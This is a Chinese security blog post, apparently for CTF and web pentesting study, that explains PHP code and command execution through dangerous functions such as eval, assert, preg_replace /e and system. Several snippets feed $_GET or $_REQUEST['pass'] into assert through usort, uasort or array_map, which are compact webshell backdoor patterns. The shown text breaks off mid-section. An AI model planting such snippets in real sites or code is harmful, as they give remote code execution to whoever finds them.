@@ -1,0 +1,1719 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="命令执行, HTML, PWN, PowerShell, Web, Python, linux">
+    <meta name="description" content="热爱生活，注重过程">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>命令执行 | kylin小小鱼</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+	<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script>
+    <script src="/libs/jquery/jquery.min.js"></script>
+	
+    
+<style type="text/css" lang="css">
+    #loading-container{
+        position: fixed;
+        top: 0;
+        left: 0;
+        min-height: 100vh;
+        width: 100vw;
+        z-index: 9999;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background: #FFF;
+        text-align: center;
+        /* loader页面消失采用渐隐的方式*/
+        -webkit-transition: opacity 1s ease;
+        -moz-transition: opacity 1s ease;
+        -o-transition: opacity 1s ease;
+        transition: opacity 1s ease;
+    }
+    .loading-image{
+        width: 120px;
+        height: 50px;
+        transform: translate(-50%);
+    }
+
+    .loading-image div:nth-child(2) {
+        -webkit-animation: pacman-balls 1s linear 0s infinite;
+        animation: pacman-balls 1s linear 0s infinite
+    }
+
+    .loading-image div:nth-child(3) {
+        -webkit-animation: pacman-balls 1s linear .33s infinite;
+        animation: pacman-balls 1s linear .33s infinite
+    }
+
+    .loading-image div:nth-child(4) {
+        -webkit-animation: pacman-balls 1s linear .66s infinite;
+        animation: pacman-balls 1s linear .66s infinite
+    }
+
+    .loading-image div:nth-child(5) {
+        -webkit-animation: pacman-balls 1s linear .99s infinite;
+        animation: pacman-balls 1s linear .99s infinite
+    }
+
+   .loading-image div:first-of-type {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_up .5s 0s infinite;
+        animation: rotate_pacman_half_up .5s 0s infinite;
+    }
+    .loading-image div:nth-child(2) {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_down .5s 0s infinite;
+        animation: rotate_pacman_half_down .5s 0s infinite;
+        margin-top: -50px;
+    }
+    @-webkit-keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @-webkit-keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @-webkit-keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+    @keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+
+    .loading-image div:nth-child(3),
+    .loading-image div:nth-child(4),
+    .loading-image div:nth-child(5),
+    .loading-image div:nth-child(6){
+        background-color: #49b1f5;
+        width: 15px;
+        height: 15px;
+        border-radius: 100%;
+        margin: 2px;
+        width: 10px;
+        height: 10px;
+        position: absolute;
+        transform: translateY(-6.25px);
+        top: 25px;
+        left: 100px;
+    }
+    .loading-text{
+        margin-bottom: 20vh;
+        text-align: center;
+        color: #2c3e50;
+        font-size: 2rem;
+        box-sizing: border-box;
+        padding: 0 10px;
+        text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
+    @media only screen and (max-width: 500px) {
+         .loading-text{
+            font-size: 1.5rem;
+         }
+    }
+    .fadeout {
+        opacity: 0;
+        filter: alpha(opacity=0);
+    }
+    /* logo出现动画 */
+    @-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{opacity:1;-webkit-transform:none;transform:none}}
+    @keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);}}
+ </style>
+ <script>
+(function () {
+    const loaded = function(){
+       setTimeout(function(){
+            const loader = document.getElementById("loading-container");
+            loader.className="fadeout" ;//使用渐隐的方法淡出loading page
+            // document.getElementById("body-wrap").style.display="flex";
+            setTimeout(function(){
+                loader.style.display="none";
+            },1000); 
+        },1000);//强制显示loading page 1s  
+    };
+    loaded();
+})()
+ </script><meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><style type="text/css" lang="css">
+    #loading-container{
+        position: fixed;
+        top: 0;
+        left: 0;
+        min-height: 100vh;
+        width: 100vw;
+        z-index: 9999;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background: #FFF;
+        text-align: center;
+        /* loader页面消失采用渐隐的方式*/
+        -webkit-transition: opacity 1s ease;
+        -moz-transition: opacity 1s ease;
+        -o-transition: opacity 1s ease;
+        transition: opacity 1s ease;
+    }
+    .loading-image{
+        width: 120px;
+        height: 50px;
+        transform: translate(-50%);
+    }
+
+    .loading-image div:nth-child(2) {
+        -webkit-animation: pacman-balls 1s linear 0s infinite;
+        animation: pacman-balls 1s linear 0s infinite
+    }
+
+    .loading-image div:nth-child(3) {
+        -webkit-animation: pacman-balls 1s linear .33s infinite;
+        animation: pacman-balls 1s linear .33s infinite
+    }
+
+    .loading-image div:nth-child(4) {
+        -webkit-animation: pacman-balls 1s linear .66s infinite;
+        animation: pacman-balls 1s linear .66s infinite
+    }
+
+    .loading-image div:nth-child(5) {
+        -webkit-animation: pacman-balls 1s linear .99s infinite;
+        animation: pacman-balls 1s linear .99s infinite
+    }
+
+   .loading-image div:first-of-type {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_up .5s 0s infinite;
+        animation: rotate_pacman_half_up .5s 0s infinite;
+    }
+    .loading-image div:nth-child(2) {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_down .5s 0s infinite;
+        animation: rotate_pacman_half_down .5s 0s infinite;
+        margin-top: -50px;
+    }
+    @-webkit-keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @-webkit-keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @-webkit-keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+    @keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+
+    .loading-image div:nth-child(3),
+    .loading-image div:nth-child(4),
+    .loading-image div:nth-child(5),
+    .loading-image div:nth-child(6){
+        background-color: #49b1f5;
+        width: 15px;
+        height: 15px;
+        border-radius: 100%;
+        margin: 2px;
+        width: 10px;
+        height: 10px;
+        position: absolute;
+        transform: translateY(-6.25px);
+        top: 25px;
+        left: 100px;
+    }
+    .loading-text{
+        margin-bottom: 20vh;
+        text-align: center;
+        color: #2c3e50;
+        font-size: 2rem;
+        box-sizing: border-box;
+        padding: 0 10px;
+        text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
+    @media only screen and (max-width: 500px) {
+         .loading-text{
+            font-size: 1.5rem;
+         }
+    }
+    .fadeout {
+        opacity: 0;
+        filter: alpha(opacity=0);
+    }
+    /* logo出现动画 */
+    @-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{opacity:1;-webkit-transform:none;transform:none}}
+    @keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);}}
+ </style>
+ <script>
+(function () {
+    const loaded = function(){
+       setTimeout(function(){
+            const loader = document.getElementById("loading-container");
+            loader.className="fadeout" ;//使用渐隐的方法淡出loading page
+            // document.getElementById("body-wrap").style.display="flex";
+            setTimeout(function(){
+                loader.style.display="none";
+            },1000); 
+        },1000);//强制显示loading page 1s  
+    };
+    loaded();
+})()
+ </script></head>
+
+
+
+ <div id="loading-container">
+     <p class="loading-text">玩命加载中 . . . </p> 
+     <div class="loading-image">
+         <div></div>
+         <div></div>
+         <div></div>
+         <div></div> 
+         <div></div>
+     </div>
+ </div><body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">kylin小小鱼</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">kylin小小鱼</div>
+        <div class="logo-desc">
+            
+            热爱生活，注重过程
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">命令执行</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Web/">
+                                <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+                                <span class="chip bg-color">命令执行</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Web/" class="post-category">
+                                Web
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-03-26
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-03-31
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    11 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h3 id="代码-命令执行"><a href="#代码-命令执行" class="headerlink" title="代码/命令执行"></a>代码/命令执行</h3><h4 id="1-概念："><a href="#1-概念：" class="headerlink" title="1.概念："></a>1.概念：</h4><p>代码执行：控制PHP的代码，就是代码执行</p>
+<p>命令执行：控制服务器含有的命令，即没有做过滤类似于<code>system()  eval()  exec()</code>  等函数</p>
+<h4 id="2-代码注入"><a href="#2-代码注入" class="headerlink" title="2.代码注入"></a>2.代码注入</h4><ul>
+<li><code>eval()</code>传入的是一个完整的语句（把任何字符串当作代码执行）</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#eval()函数实现命令执行</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span> <span class="token punctuation">;</span>
+<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<ul>
+<li><code>assert()</code>（不常用）</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#assert()函数实现命令执行</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span class="token shell-comment comment">#$a =</span><span class="token string">'echo 12345;'</span><span class="token punctuation">;</span>
+<span class="token shell-comment comment">#assert($a);</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token string">'eval("echo '</span>pwd<span class="token string">';")'</span><span class="token punctuation">;</span>
+<span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token number">123</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<ul>
+<li><code>mixed call_user_func(callable  $callback [, mixed $parameter [,mixed $... ]] )</code><ul>
+<li>第一个参数$callback就是被调用的函数，第二个参数是给第一个参数的，作为第一个函数的参数。</li>
+<li>可以调用任何内置函数或用户自定义的函数</li>
+<li>除了：<code>array() echo() empty() eval() isset() list() print() 和 unset()</code> 等语言结构函数</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#call_user_func函数</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'system'</span> <span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'pwd'</span> <span class="token punctuation">;</span>
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">'assert'</span><span class="token punctuation">,</span><span class="token string">'phpinfo()'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<ul>
+<li><code>mixed call_user_func_array(callback $callback,array $param_arr)</code> <ul>
+<li>callback 是被调用的函数，param_arr要被传入回调函数的数组</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'assert'</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'phpinfo()'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<ul>
+<li><code>string create_function(string $args,string $code)</code><ul>
+<li>该函数会创建一个匿名函数</li>
+<li>args 是要创建的匿名函数的参数，code是该匿名函数内的代码 </li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$code'</span><span class="token punctuation">,</span><span class="token string">'echo $code;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//执行该函数</span>
+<span class="token variable">$a</span> <span class="token operator">=</span><span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//执行该函数</span>
+<span class="token delimiter">?></span></code></pre>
+<ul>
+<li><code>preg_replace( mixed $pattern, mixed $replacement,mixed $subject [,int $limit=-1 [, int &amp;$count]])</code><ul>
+<li>执行一个正则表达式的搜索和替换</li>
+<li>/e修正符使preg_replace<strong>将 replacement参数当做PHP代码</strong>   (在适当的逆向引用和替换完之后，匹配不完成不执行)</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'phpinfo()'</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/abc/e"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'abcd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<ul>
+<li><code>array array_map (callable $callback，array $array1 [,array $... ] )</code><ul>
+<li>array_map为数组的每个元素应用回调函数</li>
+<li>eval()不可传入，可使用assert()</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<ul>
+<li><code>bool usort(array &amp;$array, callable $value_compare_func)</code><ul>
+<li>usort 使用用户自定义的比较函数对数组中的值进行排序</li>
+<li>注意用<strong>get</strong>传入至少两个参数用来比较，且PHPinfo不能放在usort的第二个参数上，直接放在第一个参数上就行</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span class="token shell-comment comment">#usort($_GET);</span>
+<span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<ul>
+<li><code>bool uasort(array $array,callable $value_compare_func)</code><ul>
+<li>uasort -使用用户自定义的比较函数对数组中的值进行排序并保持索引关联</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$e</span> <span class="token operator">=</span> <span class="token string">'assert'</span><span class="token punctuation">;</span>
+<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">uasort</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<ul>
+<li><code>${php代码}</code></li>
+</ul>
+<pre class=" language-php"><code class="language-php">  <span class="token delimiter">&lt;?php</span>
+  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  $<span class="token punctuation">{</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+  <span class="token delimiter">?></span></code></pre>
+<h4 id="3-命令注入"><a href="#3-命令注入" class="headerlink" title="3.命令注入"></a>3.命令注入</h4><ul>
+<li><p><code>string system(string command,int &amp;return_var)</code></p>
+<p>可以用来执行系统命令并将相应的执行结果输出</p>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'pwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<ul>
+<li><code>string exec(string command, array &amp;output, int &amp;return_var)</code><ul>
+<li>命令执行结果的<strong>最后一行内容</strong>。如果你需要获取未经处理的全部输出数据，请使用<code>passthru()</code>函数。<br>如果想要获取命令的输出内容，请确保使用output参数。</li>
+<li>command是要执行的命令</li>
+<li>output是 获得执行命令输出的每一行 字符串</li>
+<li>return_ var存放执行命令后的状态值</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> 
